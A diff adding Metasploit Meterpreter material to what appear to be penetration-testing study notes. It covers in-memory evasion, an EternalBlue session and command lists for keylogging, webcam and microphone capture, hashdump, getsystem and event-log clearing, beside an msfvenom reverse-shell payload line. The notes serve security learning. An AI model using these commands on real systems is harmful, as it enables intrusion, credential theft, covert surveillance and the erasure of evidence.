@@ -541,10 +541,216 @@ Python
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 ```
 
+# Metasploit: Meterpreter
+
+Meterpreter is a Metasploit payload that runs in memory (RAM) on the target system, not on disk, making it harder for antivirus to detect. It communicates with the attacker’s machine using encrypted traffic, helping evade IDS/IPS detection. Each instance runs under a process ID (PID), which identifies it among other running processes. This stealthy, memory-based design makes it effective for penetration testing.
+
+The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the getpid command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).
+
+```bash
+meterpreter > getpid 
+Current pid: 1304
+```
+
+If we list processes running on the target system using the ps command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.
+
+```bash
+meterpreter > ps
+
+Process List
+============
+```
+
+Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)
+```bash
+C:\Windows\system32>tasklist /m /fi "pid eq 1304"
+tasklist /m /fi "pid eq 1304"
+```
+
+## Meterpreter Flavors
 
 
 
+### Types of Payloads
+- **Staged Payloads**
+  - Delivered in **two steps**:
+    1. Small stager runs first.
+    2. Stager downloads/loads the full payload.
+  - **Pros**: Smaller initial size, works well when space is limited.
+
+- **Inline (Single) Payloads**
+  - Delivered in **one step**: full payload included in a single package.
+  - **Pros**: No second request needed.
+  - **Cons**: Larger size.
+
+---
 
 
+Meterpreter has both staged and inline versions. The available payloads cover multiple platforms:
+
+- **Android**
+- **Apple iOS**
+- **Java**
+- **Linux**
+- **OSX**
+- **PHP**
+- **Python**
+- **Windows**
+
+To list available Meterpreter payloads:
+```bash
+msfvenom --list payloads | grep meterpreter
+
+
+msf6 > use exploit/windows/smb/ms17_010_eternalblue 
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+```
+
+## Meterpreter Commands
+
+# Meterpreter Commands
+
+Every version of Meterpreter has different command options.  
+Always run the `help` command to see available commands for your session.
+
+Meterpreter provides three categories of tools:
+- **Built-in commands**
+- **Meterpreter tools**
+- **Meterpreter scripting**
+
+When running `help`, commands are grouped under categories.
+
+---
+
+## Core Commands
+Useful for navigating and managing sessions.
+
+- `background` → Backgrounds the current session  
+- `exit` → Terminates the session  
+- `guid` → Shows the session GUID (Globally Unique Identifier)  
+- `help` → Displays the help menu  
+- `info` → Shows information about a Post module  
+- `irb` → Opens an interactive Ruby shell  
+- `load` → Loads Meterpreter extensions  
+- `migrate` → Migrates Meterpreter to another process  
+- `run` → Executes a script or Post module  
+- `sessions` → Switch between sessions  
+
+---
+
+## File System Commands
+Manage files and directories on the target.
+
+- `cd` → Change directory  
+- `ls` / `dir` → List files in current directory  
+- `pwd` → Show current working directory  
+- `edit` → Edit a file  
+- `cat` → Display file contents  
+- `rm` → Delete a file  
+- `search` → Search for files  
+- `upload` → Upload a file or directory  
+- `download` → Download a file or directory  
+
+---
+
+## Networking Commands
+Inspect and manipulate networking on the target.
+
+- `arp` → Show ARP cache  
+- `ifconfig` → Show network interfaces  
+- `netstat` → Show active connections  
+- `portfwd` → Forward a local port to a remote service  
+- `route` → View/modify routing table  
+
+---
+
+## System Commands
+Interact with system processes and OS features.
+
+- `clearev` → Clear event logs  
+- `execute` → Run a command  
+- `getpid` → Show current process ID  
+- `getuid` → Show current user  
+- `kill` → Kill a process  
+- `pkill` → Kill processes by name  
+- `ps` → List running processes  
+- `reboot` → Reboot the target  
+- `shell` → Open system shell  
+- `shutdown` → Shutdown the target  
+- `sysinfo` → Show OS/system info  
+
+---
+
+## Other Commands
+Additional functionality (depends on target environment).
+
+- `idletime` → Show idle time of user  
+- **Keylogging**:  
+  - `keyscan_start` → Start keystroke capture  
+  - `keyscan_dump` → Dump captured keystrokes  
+  - `keyscan_stop` → Stop capturing  
+
+- **Screen/Camera**:  
+  - `screenshare` → Watch remote desktop  
+  - `screenshot` → Capture screen  
+  - `webcam_list` → List webcams  
+  - `webcam_snap` → Take a webcam snapshot  
+  - `webcam_stream` → Stream webcam  
+  - `webcam_chat` → Start video chat  
+
+- **Audio**:  
+  - `record_mic` → Record from microphone  
+
+- **Privilege & Passwords**:  
+  - `getsystem` → Attempt privilege escalation  
+  - `hashdump` → Dump SAM database  
+
+---
+
+⚠**Note**: Some commands may not work if the required hardware/software is missing (e.g., no webcam, VM without desktop).
+
+### Post-Exploitation with Meterpreter
+
+Meterpreter Commands – Post-Exploitation Guide
+
+Meterpreter is a powerful Metasploit payload used during the **post-exploitation phase**.  
+It provides built-in tools, modules, and scripts to interact with the target system.
+
+⚡ Always run `help` in a session to see available commands, as they differ between Meterpreter versions.
+
+---
+
+### 📖 Categories of Commands
+- **Core commands**
+- **File system commands**
+- **Networking commands**
+- **System commands**
+- **Other commands (UI, Webcam, Keylogging, etc.)**
+
+---
+
+### Core Commands
+Manage sessions and interact with Meterpreter itself.
+
+| Command       | Description |
+|---------------|-------------|
+| `?` / `help`  | Show help menu |
+| `background`  | Backgrounds the current session |
+| `bg`          | Alias for background |
+| `bgkill`      | Kill a background script |
+| `bglist`      | List background scripts |
+| `bgrun`       | Run script in background |
+| `channel`     | Manage active channels |
+| `close`       | Close a channel |
+| `sessions`    | Switch between sessions |
+| `migrate`     | Migrate into another process |
+| `guid`        | Show session GUID |
+
+Example:
+```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 
 
